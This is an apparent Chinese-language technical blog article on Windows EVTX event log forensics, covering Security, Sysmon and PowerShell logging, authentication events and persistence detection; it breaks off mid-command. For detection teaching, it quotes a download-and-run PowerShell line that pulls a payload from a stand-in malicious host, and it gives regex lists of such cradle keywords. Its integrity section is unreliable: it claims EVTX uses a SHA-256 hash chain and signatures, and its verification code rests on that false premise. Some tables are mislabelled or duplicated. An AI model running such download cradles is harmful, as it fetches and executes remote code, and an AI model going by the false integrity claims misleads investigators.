---
title: "Windows事件日志深度取证分析"
date: 2026-07-10T11:00:00+08:00
draft: false
weight: 700
description: "深入解析Windows事件日志（EVTX）取证分析全流程，涵盖EVTX二进制文件格式解析、Chunk/Record模板结构、日志签名与篡改检测、System/Security/Sysmon关键Event ID深度分析、PowerShell Module Logging与Script Block Logging取证、Kerberos/NTLM身份认证事件关联、日志清理反取证检测技术、多源日志时间线构建方法，结合APT攻击案例提供Sigma规则与自动化检测脚本"
categories: ["应急响应", "取证分析"]
tags: ["Windows事件日志", "EVTX", "Sysmon", "日志取证", "PowerShell日志", "身份认证", "反取证检测", "Sigma规则", "MITRE ATT&CK", "应急响应"]
---

# Windows事件日志深度取证分析

Windows事件日志是操作系统中最重要的数字取证数据源之一。自Windows Vista引入EVTX（XML-based Event Log）格式以来，事件日志系统经历了重大架构变革——从传统的EVT二进制格式演进到基于XML的结构化存储，为取证分析提供了更丰富的上下文信息和更可靠的数据完整性保障。在应急响应场景中，事件日志几乎是每一起Windows系统入侵调查的必查数据源，它记录了系统启动、用户登录、进程创建、权限变更、策略修改等关键安全事件的完整生命周期。

然而，Windows事件日志取证远非简单的日志查看。一个成熟的取证分析体系需要覆盖EVTX二进制文件格式的底层解析能力、日志签名验证与篡改检测技术、多通道日志的交叉关联方法、反取证对抗手段的识别、以及自动化检测与狩猎规则的编写。攻击者在获取系统权限后，通常会优先清除或操纵事件日志以隐藏攻击痕迹——这意味着取证人员不仅需要理解日志记录了什么，更需要判断日志是否被篡改、是否存在记录缺口、以及如何从多个独立日志源构建完整的攻击时间线。

本文从蓝队取证实战视角出发，系统性地覆盖Windows事件日志取证分析的全流程，涵盖EVTX文件格式底层结构、关键Event ID深度解读、PowerShell脚本引擎日志分析、Kerberos/NTLM身份认证日志关联、计划任务与服务持久化检测、日志清理反取证识别、多源日志时间线构建等核心技术。结合APT29（Cozy Bear）日志操纵、Lazarus Group事件日志分析等真实案例，构建完整的Windows事件日志取证方法论。

---

## 0x01 技术基础与取证概述

### EVTX文件格式概览

Windows Vista及后续操作系统引入了全新的事件日志格式EVTX，替代了Windows XP/2003使用的EVT格式。EVTX格式基于XML存储结构，采用Chunk分块机制组织数据，支持模板化记录以提高存储效率。

| 特性 | EVT格式（Windows XP/2003） | EVTX格式（Windows Vista+） |
|------|--------------------------|--------------------------|
| 文件扩展名 | .evt | .evtx |
| 存储结构 | 顺序二进制记录 | Chunk分块 + XML模板 |
| 最大文件大小 | 300MB（默认） | 1GB（默认，可配置） |
| 记录容量 | 约30,000条 | 约数百万条 |
| 数据完整性 | 无签名验证 | SHA-256哈希链 + 数字签名 |
| Unicode支持 | 有限 | 完整UTF-16LE |
| 查询能力 | 顺序扫描 | XPath查询 + 索引 |

### 日志通道架构

Windows事件日志系统采用通道化（Channel）架构，每类日志作为独立通道运行。理解通道架构是取证分析的基础。

| 日志通道 | 默认路径 | 主要内容 | 取证价值 |
|---------|---------|---------|---------|
| Security | %SystemRoot%\System32\winevt\Logs\Security.evtx | 登录/注销、权限变更、对象访问 | ⭐⭐⭐⭐⭐ |
| System | %SystemRoot%\System32\winevt\Logs\System.evtx | 系统服务、驱动加载、时间变更 | ⭐⭐⭐⭐ |
| Application | %SystemRoot%\System32\winevt\Logs\Application.evtx | 应用程序错误、安装记录 | ⭐⭐⭐ |
| Setup | %SystemRoot%\System32\winevt\Logs\Setup.evtx | 系统安装、更新、组件配置 | ⭐⭐⭐ |
| Sysmon | %SystemRoot%\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx | 进程创建、网络连接、文件操作 | ⭐⭐⭐⭐⭐ |
| PowerShell | %SystemRoot%\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx | PowerShell脚本执行记录 | ⭐⭐⭐⭐⭐ |
| Windows PowerShell | %SystemRoot%\System32\winevt\Logs\Windows PowerShell.evtx | PowerShell引擎启停 | ⭐⭐⭐ |
| WMI-Activity | %SystemRoot%\System32\winevt\Logs\Microsoft-Windows-WMI-Activity%4Operational.evtx | WMI操作记录 | ⭐⭐⭐⭐ |
| TaskScheduler | %SystemRoot%\System32\winevt\Logs\Microsoft-Windows-TaskScheduler%4Operational.evtx | 计划任务执行记录 | ⭐⭐⭐⭐ |
| DNS-Client | %SystemRoot%\System32\winevt\Logs\Microsoft-Windows-DNS-Client%4Operational.evtx | DNS解析查询记录 | ⭐⭐⭐ |

### 日志策略配置与取证影响

Windows组策略中对事件日志的配置直接影响取证分析的可用数据量。取证人员首先需要评估目标系统的日志策略配置：

| 策略配置项 | 默认值 | 取证建议 | 影响 |
|-----------|-------|---------|------|
| Security日志最大大小 | 20MB（旧版）/ 1GB（新版） | 至少设置为1GB以上 | 小容量会导致日志轮转过快 |
| Security日志保留策略 | 按需覆盖 | 设置为"不要覆盖事件" | 防止关键日志被覆盖 |
| Audit Policy（审核策略） | 部分启用 | 启用所有审核类别 | 确保全面的事件记录 |
| PowerShell Module Logging | 默认禁用 | 启用所有模块 | 记录PowerShell操作详情 |
| PowerShell Script Block Logging | 默认禁用 | 启用 | 记录完整脚本内容 |
| Sysmon | 未安装 | 安装并配置细粒度规则 | 提供进程级监控能力 |
| Command-line auditing | 默认禁用（旧版） | 启用 | 记录进程创建时的命令行参数 |

### 取证工具链

Windows事件日志取证涉及多层次的工具使用，从底层格式解析到高层分析平台：

| 工具 | 用途 | 特点 |
|------|------|------|
| evtx_dump（EVTX-parser） | EVTX文件底层解析与导出 | 开源、支持模板解析 |
| evtxparse | EVTX记录解析与过滤 | Python实现、支持自定义过滤 |
| EvtxECmd（Eric Zimmerman） | EVTX批量解析与时间线输出 | Windows平台、支持多文件批处理 |
| LogParser | 微软官方SQL查询工具 | 支持SQL语法查询日志 |
| Chainsaw | 快速日志搜索与Sigma规则匹配 | Rust实现、内置Sigma引擎 |
| hayabusa | 日志时间线生成与威胁狩猎 | Rust实现、内置Sigma规则库 |
| Jupyter Notebook | 交互式日志分析 | Python生态、可视化能力强 |
| Plaso/log2timeline | 多源日志时间线构建 | 跨平台、支持200+格式 |
| Timesketch | 协作式时间线分析 | Web界面、团队协作 |

---

## 0x02 EVTX文件格式深度解析

### XML存储结构

EVTX文件内部采用XML格式存储每条事件记录。一条完整的Windows事件日志记录包含以下XML结构：

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"/>
    <EventID>4688</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>13312</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2026-03-15T08:23:45.1234567Z"/>
    <EventRecordID>12345678</EventRecordID>
    <Correlation ActivityID="{00000000-0000-0000-0000-000000000000}"/>
    <Execution ProcessID="4" ThreadID="48"/>
    <Channel>Security</Channel>
    <Computer>WORKSTATION01.corp.local</Computer>
    <Security/>
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-18</Data>
    <Data Name="SubjectUserName">SYSTEM</Data>
    <Data Name="SubjectDomainName">NT AUTHORITY</Data>
    <Data Name="SubjectLogonId">0x3e7</Data>
    <Data Name="NewProcessId">0x1a2b</Data>
    <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
    <Data Name="TokenElevationType">%%1937</Data>
    <Data Name="ProcessId">0x0e1c</Data>
    <Data Name="CommandLine">cmd.exe /c whoami</Data>
    <Data Name="TargetUserSid">S-1-0-0</Data>
    <Data Name="TargetUserName">-</Data>
    <Data Name="TargetDomainName">-</Data>
    <Data Name="TargetLogonId">0x0</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="MandatoryLabel">S-1-16-16384</Data>
  </EventData>
</Event>
```

System字段是所有事件日志共有的元数据，包含了事件来源、ID、时间戳、相关性ID（用于关联同一操作的多个事件）、执行上下文（进程ID和线程ID）以及日志通道和计算机名。EventData字段则根据事件ID的不同而包含不同的数据字段，是取证分析的核心数据区域。

### Chunk分块机制

EVTX文件内部被划分为多个固定大小的Chunk（块），每个Chunk大小为64KB（65,536字节）。Chunk结构是EVTX格式的核心组织方式：

| 字段 | 偏移量 | 大小 | 说明 |
|------|--------|------|------|
| Magic "ElfFile" | 0x00 | 8字节 | 文件头魔数标识 |
| FirstChunkNumber | 0x08 | 8字节 | 第一个Chunk编号 |
| LastChunkNumber | 0x10 | 8字节 | 最后一个Chunk编号 |
| NextRecordIdentifier | 0x18 | 8字节 | 下一条记录的EventRecordID |
| HeaderSize | 0x20 | 4字节 | 头部大小（128字节） |
| MinorVersion | 0x24 | 2字节 | 次版本号 |
| MajorVersion | 0x26 | 2字节 | 主版本号（3） |
| HeaderBlockSize | 0x28 | 2字节 | 头部块大小（4096字节） |
| NumberOfChunks | 0x2A | 2字节 | Chunk总数 |

每个Chunk内部包含独立的头部信息、事件记录和模板定义。Chunk采用环形缓冲区（Ring Buffer）机制，当所有Chunk写满后，新记录会覆盖最旧的Chunk。这种机制意味着取证分析需要特别关注Chunk编号的连续性。

### EventRecordID连续性分析

EventRecordID是每条事件记录的唯一递增编号，在取证中具有关键意义。通过分析EventRecordID的连续性，可以检测日志清除和篡改行为：

```bash
python3 evtx_dump.py Security.evtx --output json | jq '.EventRecordID' | sort -n | uniq -d
```

```bash
python3 evtx_dump.py Security.evtx --output json | jq '.EventRecordID' | sort -n | awk 'NR>1{if($1!=prev+1) print "Gap: "prev" -> "$1} {prev=$1}'
```

| 检测场景 | EventRecordID特征 | 说明 |
|---------|------------------|------|
| 正常运行 | 连续递增，无间隔 | 系统持续运行，日志正常记录 |
| 日志清除（1102事件） | 编号重置或大跳跃 | 清除后新记录从新的起始编号开始 |
| 服务重启 | 正常递增但时间戳跳跃 | 服务重启不会重置EventRecordID |
| 日志轮转 | 编号连续但旧记录被覆盖 | Chunk覆盖导致早期记录丢失 |
| 手动删除记录 | 编号中间出现断层 | 非标准操作，高度可疑 |
| 系统关机期间 | 时间戳出现间隔但编号连续 | 正常现象，关机期间无事件 |

### 日志签名验证与篡改检测

EVTX格式内置了SHA-256哈希链机制，为篡改检测提供了密码学保障。每个Chunk的头部包含两个关键哈希值：

- **ChunkHash**：对整个Chunk内容（不含头部前120字节）的SHA-256哈希
- **Dirty**标志：指示该Chunk是否正在写入（0表示Clean，非0表示Dirty）

```bash
python3 evtx_dump.py --validate Security.evtx 2>&1 | head -20
```

```python
import hashlib
import struct

def verify_chunk_hash(chunk_data):
    chunk_hash_stored = chunk_data[120:152]
    data_to_hash = chunk_data[:120] + chunk_data[152:]
    computed_hash = hashlib.sha256(data_to_hash).digest()
    return chunk_hash_stored == computed_hash
```

| 验证项目 | 预期结果 | 异常含义 |
|---------|---------|---------|
| ChunkHash验证 | 每个Chunk的哈希匹配 | Chunk数据被篡改 |
| Dirty标志 | 正常关闭后所有Chunk为Clean | 非正常关机或写入中断 |
| Signature验证 | 最后一个Chunk包含有效签名 | 日志可能被篡改后伪造签名 |
| Chunk编号连续性 | Chunk编号从0开始连续递增 | Chunk被删除或替换 |
| 记录大小校验 | 每条记录大小在合理范围内 | 记录被破坏或伪造 |

### evtx_dump与evtxparse工具用法

evtx_dump是目前最常用的EVTX底层解析工具，支持多种输出格式：

```bash
evtx_dump -o json Security.evtx > security_events.json

evtx_dump -o xml Security.evtx | xmllint --xpath '//Event[System[EventID=4688]]' -

evtx_dump --export-templates Security.evtx > templates.json

evtx_dump --output json System.evtx | jq 'select(.System.EventID == 7045)'
```

evtxparse提供更灵活的过滤和分析能力：

```bash
python3 evtxparse.py Security.evtx --filter "EventID=4688" --format csv

python3 evtxparse.py Security.evtx --filter "EventID=4624 AND LogonType=10" --output filtered.json

python3 evtxparse.py --multiple /var/evtx/*.evtx --correlate --timeline
```

---

## 0x03 系统与安全日志深度分析

### Security日志关键Event ID

Security日志是Windows取证中价值最高的日志通道，记录了所有与安全相关的系统事件。以下是最关键的安全事件ID及其取证意义：

| Event ID | 事件名称 | MITRE ATT&CK | 取证价值 |
|----------|---------|-------------|---------|
| 4624 | 成功登录 | T1078/T1134 | 用户登录行为分析 |
| 4625 | 登录失败 | T1110/T1078 | 暴力破解检测 |
| 4634 | 注销 | T1078 | 会话生命周期 |
| 4648 | 显式凭据登录 | T1550.002 | RunAs/Pass-the-Hash |
| 4672 | 特权登录 | T1078/T1134 | 管理员账户活动 |
| 4688 | 新进程创建 | T1059/T1053 | 命令行审计核心事件 |
| 4689 | 进程退出 | - | 进程生命周期 |
| 4697 | 服务安装 | T1543.003 | 持久化检测 |
| 4698 | 计划任务创建 | T1053.005 | 持久化检测 |
| 4699 | 计划任务删除 | T1070.003 | 日志清理检测 |
| 4700 | 计划任务启用 | T1053.005 | 持久化激活 |
| 4702 | 计划任务更新 | T1053.005 | 持久化变更 |
| 4720 | 用户账户创建 | T1136.001 | 后门账户检测 |
| 4722 | 用户账户启用 | T1136.001 | 账户状态变更 |
| 4724 | 密码重置尝试 | T1098.001 | 后门账户激活 |
| 4726 | 用户账户删除 | T1070.003 | 覆盖痕迹 |
| 4728 | 安全组成员添加 | T1098.003 | 权限提升 |
| 4732 | 本地组成员添加 | T1098.003 | 权限提升 |
| 4735 | 本地组更改 | T1098.003 | 组策略修改 |
| 4738 | 用户账户更改 | T1136.002 | 后门配置 |
| 4756 | 通用安全组成员添加 | T1098.003 | 域级权限提升 |
| 4765 | SID历史注入 | T1134.001 | Golden Ticket |
| 4766 | SID历史注入失败 | T1134.001 | Golden Ticket尝试 |
| 4768 | Kerberos TGT请求 | T1558.001 | Kerberos认证 |
| 4769 | Kerberos TGS请求 | T1558.003 | 票据服务请求 |
| 4771 | Kerberos预认证失败 | T1110 | Kerberos暴力破解 |
| 4776 | NTLM认证 | T1110 | NTLM暴力破解 |
| 4778 | 会话重连 | T1021 | RDP会话分析 |
| 4779 | 会话断开 | T1021 | RDP会话分析 |
| 1102 | 审计日志已清除 | T1070.001 | 日志清理确认 |

### 进程创建事件（4688）深度分析

Event ID 4688是Windows安全审计中最重要的事件之一，记录了每个新进程的创建信息。启用命令行审计后，该事件会包含完整的进程命令行参数，是检测恶意活动的核心数据源。

| 字段名 | 说明 | 取证用途 |
|--------|------|---------|
| SubjectUserSid | 创建进程的用户SID | 确定操作者身份 |
| SubjectUserName | 创建进程的用户名 | 关联用户账户 |
| SubjectDomainName | 域名/计算机名 | 确定账户来源 |
| SubjectLogonId | 登录会话ID | 关联登录事件 |
| NewProcessId | 新进程PID（十六进制） | 进程跟踪 |
| NewProcessName | 新进程可执行文件路径 | 进程识别 |
| TokenElevationType | UAC令牌提升类型 | 判断是否提权 |
| ProcessId | 父进程PID | 进程树构建 |
| CommandLine | 完整命令行参数 | **核心取证字段** |
| ParentProcessName | 父进程名称 | 进程树分析 |
| MandatoryLabel | 完整性级别 | 低完整性→沙箱/恶意软件 |

以下命令用于从EVTX文件中提取4688事件并分析进程创建链：

```bash
evtx_dump -o json Security.evtx | jq 'select(.Event.System.EventID == 4688) | {
  time: .Event.System.TimeCreated."@SystemTime",
  record_id: .Event.System.EventRecordID,
  user: .Event.EventData.SubjectUserName,
  process: .Event.EventData.NewProcessName,
  parent: .Event.EventData.ParentProcessName,
  cmd: .Event.EventData.CommandLine,
  pid: .Event.EventData.NewProcessId
}'
```

### Sysmon Event ID深度分析

Sysmon（System Monitor）是Microsoft Sysinternals套件中的高级系统监控工具，提供了远超原生Windows审计的细粒度监控能力。在取证分析中，Sysmon日志通常是最有价值的数据源之一。

| Sysmon Event ID | 事件类型 | MITRE ATT&CK | 关键字段 |
|----------------|---------|-------------|---------|
| 1 | 进程创建 | T1059/T1053 | ProcessId, Image, CommandLine, ParentImage, Hashes |
| 2 | 文件创建时间变更 | T1070.006 | TargetFilename, CreationUtcTime, PreviousCreationUtcTime |
| 3 | 网络连接 | T1071/T1572 | SourceIp, DestinationIp, DestinationPort, Image |
| 4 | Sysmon服务状态 | - | SchemaVersion, State |
| 5 | 进程已终止 | - | ProcessId, Image |
| 6 | 驱动加载 | T1014/T1542.001 | ImageLoaded, Hashes, Signed |
| 7 | DLL加载 | T1574/T1218 | ImageLoaded, Image, Hashes |
| 8 | 远程线程创建 | T1055.003 | SourceProcess, TargetProcess, StartModule, StartFunction |
| 9 | 原始磁盘读取 | T1005 | Device, ProcessId, Image |
| 10 | 进程访问 | T1055/T1003 | SourceImage, TargetImage, GrantedAccess |
| 11 | 文件创建 | T1105/T1565.001 | TargetFilename, Image |
| 12 | 注册表对象创建/删除 | T1547.001/T1112 | EventType, TargetObject, Image |
| 13 | 注册表值修改 | T1547.001/T1112 | TargetObject, Details, Image |
| 14 | 注册表键重命名 | T1112 | TargetObject, Image |
| 15 | 文件流创建 | T1564.004 | TargetFilename, StreamName |
| 17 | 管道创建 | T1570 | PipeName, Image |
| 18 | 管道连接 | T1570 | PipeName, Image |
| 19 | WMI事件过滤 | T1546.003 | Query, Consumer, FilterName |
| 20 | WMI事件消费者 | T1546.003 | Name, Type, Destination |
| 21 | WMI事件消费者创建 | T1546.003 | EventNamespace, Name |
| 22 | DNS查询 | T1568/T1071 | QueryName, QueryResults, Image |
| 23 | 文件删除 | T1070.004 | TargetFilename, Image, RuleName |
| 24 | 剪贴板内容 | T1115 | ProcessName, ClientInfo |
| 25 | 进程篡改 | T1055.012 | Image, TargetFilename, EventType |
| 26 | 堆段分配 | T1055 | Image, ClientThreadId, AllocationType |
| 27 | PE文件传输 | T1105 | ImageLoaded, Hashes |

**高取证价值Sysmon事件的检测模式：**

| 检测场景 | Sysmon Event ID | 检测逻辑 |
|---------|----------------|---------|
| 进程注入 | 8 + 10 | 远程线程创建 + 异常进程访问 |
| 文件流隐藏 | 15 | Alternate Data Stream创建 |
| WMI持久化 | 19 + 20 + 21 | WMI事件订阅链 |
| 注册表持久化 | 12 + 13 | Run键/服务键修改 |
| LOLBin滥用 | 1 | cmd.exe/powershell.exe由非标准父进程启动 |
| DNS隧道 | 22 | 高频TXT查询、超长域名、Base64特征 |
| 证书窃取 | 11 | .pfx/.pem/.key文件创建 |

---

## 0x04 PowerShell与脚本引擎日志取证

### PowerShell日志架构

PowerShell是攻击者在Windows环境中最常用的攻击向量之一。微软提供了多层次的日志记录机制来捕获PowerShell活动：

| 日志类型 | 默认状态 | 事件ID | 记录内容 | 取证价值 |
|---------|---------|--------|---------|---------|
| Module Logging（模块日志） | 禁用 | 4103 | 模块/函数调用记录 | ⭐⭐⭐⭐ |
| Script Block Logging（脚本块日志） | 禁用 | 4104 | 完整脚本内容 | ⭐⭐⭐⭐⭐ |
| Transcription（转录日志） | 禁用 | - | 会话输入输出全文 | ⭐⭐⭐⭐ |
| PowerShell日志（旧版） | 启用（基本级别） | 400/403/600 | 引擎启停事件 | ⭐⭐ |

### Module Logging（4103）分析

Module Logging记录PowerShell模块中导出函数的调用信息。当Module Logging启用并配置了具体的模块列表后，每次模块函数调用都会生成4103事件。

```
ContextInfo:        None
UserData:
SequenceNumber:    1
Hostname:          WORKSTATION01
HostVersion:       5.1.19041.1
EngineVersion:     5.1.19041.1
RunspaceId:        a1b2c3d4-e5f6-7890-abcd-ef1234567890
PipelineId:
CommandName:
CommandType:       Cmdlet
ScriptName:
CommandPath:
CommandLine:       Get-WmiObject -Class Win32_Process
```

| 字段 | 取证用途 |
|------|---------|
| HostVersion | PowerShell版本，旧版本可能缺乏日志能力 |
| CommandLine | 执行的PowerShell命令（与4104互补） |
| PipelineId | 关联同一管道中的多个命令 |
| ScriptName | 外部脚本文件路径 |

### Script Block Logging（4104）深度分析

Script Block Logging是PowerShell取证中最核心的日志类型，它记录了PowerShell引擎执行的每个脚本块的完整文本内容。即使攻击者使用了Base64编码、字符串拼接、Invoke-Expression等混淆技术，Script Block Logging都能在脚本块被引擎实际执行时记录其解混淆后的内容。

```
MessageRecord:
  ScriptBlockText:  Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')
  ScriptBlockId:    a1b2c3d4-e5f6-7890-abcd-ef1234567890
  Path:             (该事件来自'无'，因此没有关联路径)
```

4104事件的关键特征：

| 特征 | 说明 | 取证意义 |
|------|------|---------|
| Message总数 | 一个脚本块可能被拆分为多个4104事件 | 需要按ScriptBlockId聚合 |
| Path字段 | 显示脚本文件路径，命令行为"-" | 区分文件执行与交互式执行 |
| IsPartial | 标记是否为部分记录 | 大型脚本块的分段传输 |
| ScriptBlockText | 解混淆后的脚本内容 | 攻击意图分析的核心字段 |

**高危PowerShell脚本块的取证特征：**

```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
```

```
IEX (New-Object Net.WebClient).DownloadString('http://
```

```
[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(
```

```
$PEBytes = [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA
```

```bash
evtx_dump -o json "Microsoft-Windows-PowerShell%4Operational.evtx" | jq 'select(.Event.System.EventID == 4104) | {
  time: .Event.System.TimeCreated."@SystemTime",
  script_block_id: .Event.EventData.ScriptBlockId,
  path: .Event.EventData.Path,
  message_total: .Event.EventData.MessageNumber,
  text: .Event.EventData.ScriptBlockText
}' | jq -s 'group_by(.script_block_id) | map({id: .[0].script_block_id, path: .[0].path, full_text: [.[].text] | join("")})'
```

### Transcript日志与Constrained Language Mode检测

Transcription日志提供PowerShell会话的完整输入输出记录，包含时间戳、用户身份、命令和输出结果。Transcript日志默认不启用，需要通过组策略或代码手动启用。

Constrained Language Mode是PowerShell的安全约束机制，限制了.NET类型访问和动态代码执行能力。攻击者通常会尝试绕过CLM来执行恶意负载。检测CLM是否被绕过：

```bash
evtx_dump -o json "Microsoft-Windows-PowerShell%4Operational.evtx" | jq 'select(.Event.System.EventID == 4104) | select(.Event.EventData.ScriptBlockText | test("ConstrainedLanguage|LanguageMode|AppLocker|CLM"; "i"))'

evtx_dump -o json "Microsoft-Windows-PowerShell%4Operational.evtx" | jq 'select(.Event.System.EventID == 4104) | select(.Event.EventData.ScriptBlockText | test("System\\.Reflection|Assembly\\.Load|FromBase64String|IEX|Invoke-Expression|DownloadString|DownloadFile|Net\\.WebClient|Start-Process.*-WindowStyle Hidden"; "i"))'
```

### AMSI事件（4102）

AMSI（Antimalware Scan Interface）是Windows 10引入的反恶意软件接口，PowerShell脚本在执行前会通过AMSI传递给已安装的反恶意软件产品进行扫描。Event ID 4102记录AMSI扫描结果：

| 字段 | 取证用途 |
|------|---------|
| HostApplication | 触发AMSI扫描的PowerShell命令 |
| ScannerProcessId | AMSI扫描器进程ID |
| Status | 扫描结果（0=通过，非0=检测到恶意） |

---

## 0x05 网络与身份认证日志取证

### Kerberos身份认证事件

Kerberos是Active Directory域环境中的主要认证协议。在取证分析中，Kerberos相关事件是检测横向移动、票据攻击和域持久化的关键数据源。

| Event ID | 事件名称 | KDC状态码 | MITRE ATT&CK | 取证用途 |
|----------|---------|----------|-------------|---------|
| 4768 | TGT请求 | 0x0=成功 | T1558.001 | 认证发起、Golden Ticket |
| 4769 | TGS请求 | 0x0=成功 | T1558.003 | 服务访问、Silver Ticket |
| 4770 | TGT续签 | - | T1558.001 | 长期票据使用 |
| 4771 | 预认证失败 | 0x18=错误密码 | T1110 | Kerberos暴力破解 |
| 4772 | TGT请求失败 | 非0 | T1110 | 认证失败 |
| 4765 | SID历史注入成功 | - | T1134.001 | Golden Ticket确认 |
| 4766 | SID历史注入失败 | - | T1134.001 | Golden Ticket尝试 |

**Kerberos票据请求的关键字段：**

| 字段 | 4768中的含义 | 4769中的含义 |
|------|-------------|-------------|
| Account Name | 请求TGT的用户 | 请求TGS的用户 |
| Client Address | 客户端IP | 客户端IP |
| Ticket Encryption Type | 加密类型 | 加密类型 |
| Ticket Options | 票据选项 | 票据选项 |
| Service Name | krbtgt（TGT服务） | 目标服务SPN |
| Status | 请求结果 | 请求结果 |

**Kerberos加密类型取证分析：**

| 加密类型代码 | 算法 | 安全性 | 取证关注 |
|-------------|------|--------|---------|
| 0x17 | RC4-HMAC | 弱 | NTLM兼容，可能为Pass-the-Hash |
| 0x11 | AES128 | 强 | 正常使用 |
| 0x12 | AES256 | 强 | 正常使用 |
| 0x11 | AES128-CTS-HMAC-SHA1 | 强 | 正常使用 |
| 0x12 | AES256-CTS-HMAC-SHA1 | 强 | 正常使用 |

### NTLM身份认证事件

NTLM是Windows中的传统认证协议，在许多环境中仍然启用。NTLM相关事件是检测暴力破解、Pass-the-Hash和NTLM中继攻击的重要数据源。

| Event ID | 事件名称 | Logon Type | MITRE ATT&CK | 取证用途 |
|----------|---------|-----------|-------------|---------|
| 4624 | 成功登录 | 2=交互式 | T1078 | 本地登录 |
| 4624 | 成功登录 | 3=网络 | T1078/T1550.002 | 网络共享访问、PTH |
| 4624 | 成功登录 | 4=批处理 | T1053 | 计划任务 |
| 4624 | 成功登录 | 5=服务 | T1543 | 服务账户 |
| 4624 | 成功登录 | 7=解锁 | - | 终端解锁 |
| 4624 | 成功登录 | 8=网络明文 | T1550 | 早期NTLM |
| 4624 | 成功登录 | 9=新凭据 | T1550.002 | RunAs / Pass-the-Hash |
| 4624 | 成功登录 | 10=远程交互 | T1021 | RDP登录 |
| 4624 | 成功登录 | 11=缓存凭据 | T1134 | 缓存域凭据 |
| 4625 | 登录失败 | 所有类型 | T1110 | 暴力破解 |
| 4648 | 显式凭据登录 | - | T1550.002 | 显式指定凭据 |
| 4672 | 特殊权限分配 | - | T1134 | 管理员登录 |

**Pass-the-Hash检测模式：**

| 检测特征 | 日志表现 | 说明 |
|---------|---------|------|
| LogonType=9异常 | 4624 LogonType=9 + 非标准时间 | RunAs或PTH |
| NTLM认证来源 | 4768请求中无对应NTLM事件 | 异常认证路径 |
| 加密类型RC4 | 4768/4769中EncryptionType=0x17 | 弱加密，可能PTH |
| 源主机不匹配 | 4624中Workstation与实际不一致 | 伪造工作站名 |

```bash
evtx_dump -o json Security.evtx | jq 'select(.Event.System.EventID == 4624) | select(.Event.EventData.LogonType == "9") | {
  time: .Event.System.TimeCreated."@SystemTime",
  user: .Event.EventData.TargetUserName,
  domain: .Event.EventData.TargetDomainName,
  source_ip: .Event.EventData.IpAddress,
  workstation: .Event.EventData.WorkstationName,
  process: .Event.EventData.ProcessName,
  auth_package: .Event.EventData.AuthenticationPackageName
}'
```

### Golden Ticket与Silver Ticket日志特征

Golden Ticket和Silver Ticket是Kerberos票据攻击的两种主要形式，分别伪造TGT和TGS：

| 特征 | Golden Ticket | Silver Ticket |
|------|-------------|--------------|
| 伪造对象 | TGT | TGS |
| 需要的信息 | krbtgt NTLM哈希 | 服务NTLM哈希 |
| 可访问范围 | 域内所有服务 | 特定服务 |
| 日志特征 | 4768中无对应认证请求 | 4769中ServiceName为目标服务 |
| 检测方法 | 无对应4768的4769请求 | 无对应4768的4769请求 |
| MITRE ATT&CK | T1558.001 | T1558.003 |

---

## 0x06 计划任务与服务日志取证

### 计划任务创建与执行事件

计划任务是攻击者实现持久化和提权的常用手段之一。Windows提供了多层次的计划任务事件用于审计和取证。

| Event ID | 日志通道 | 事件名称 | MITRE ATT&CK | 取证用途 |
|----------|---------|---------|-------------|---------|
| 4698 | Security | 计划任务已创建 | T1053.005 | 持久化检测（含XML定义） |
| 4699 | Security | 计划任务已删除 | T1070.003 | 清除痕迹 |
| 4700 | Security | 计划任务已启用 | T1053.005 | 持久化激活 |
| 4701 | Security | 计划任务已禁用 | T1053.005 | 持久化暂停 |
| 4702 | Security | 计划任务已更新 | T1053.005 | 持久化变更 |
| 106 | TaskScheduler | 计划任务已注册 | T1053.005 | 任务注册确认 |
| 140 | TaskScheduler | 计划任务已更新 | T1053.005 | 任务更新 |
| 141 | TaskScheduler | 计划任务已删除 | T1070.003 | 任务删除确认 |
| 200 | TaskScheduler | 计划任务已执行（开始） | T1053.005 | 任务启动 |
| 201 | TaskScheduler | 计划任务已执行（完成） | T1053.005 | 任务执行结果 |
| 325 | TaskScheduler | 计划任务请求启动 | T1053.005 | 触发器触发 |

**4698事件的关键取证字段：**

4698事件包含完整的计划任务XML定义，这是取证分析的核心数据。XML定义中包含以下关键信息：

| XML字段 | 取证用途 |
|---------|---------|
| Actions/Exec/Command | 执行的可执行文件路径 |
| Actions/Exec/Arguments | 命令行参数 |
| Triggers | 触发条件（登录时、启动时、定时等） |
| Principal/UserId | 运行账户 |
| Settings/RunLevel | 是否以最高权限运行 |
| Settings/Hidden | 是否隐藏任务 |

```bash
evtx_dump -o json Security.evtx | jq 'select(.Event.System.EventID == 4698) | {
  time: .Event.System.TimeCreated."@SystemTime",
  user: .Event.EventData.SubjectUserName,
  task_name: .Event.EventData.TaskName,
  task_content: .Event.EventData.TaskContent
}'
```

### 服务安装事件（4697）

服务安装是另一种常见的持久化和提权手段。Event ID 4697记录服务的安装事件：

| 字段 | 取证用途 |
|------|---------|
| ServiceName | 服务名称 |
| ServiceFileName | 服务可执行文件路径（**关键字段**） |
| ServiceType | 服务类型 |
| ServiceStartType | 启动类型 |
| ServiceAccountName | 运行账户 |

**服务持久化检测模式：**

| 异常模式 | 检测逻辑 | 可能攻击 |
|---------|---------|---------|
| 可执行文件路径异常 | 非标准路径（Temp、AppData等） | 恶意服务 |
| 服务类型异常 | UserMode进程（0x10）+ 自定义路径 | 持久化后门 |
| 启动类型异常 | 自动启动 + 异常可执行文件 | 开机自启后门 |
| 服务账户异常 | LocalSystem + 网络活动 | 提权后横向 |
| 服务名混淆 | 命名类似系统服务（svchost变体） | 隐蔽持久化 |

```bash
evtx_dump -o json Security.evtx | jq 'select(.Event.System.EventID == 4697) | {
  time: .Event.System.TimeCreated."@SystemTime",
  service_name: .Event.EventData.ServiceName,
  service_file: .Event.EventData.ServiceFileName,
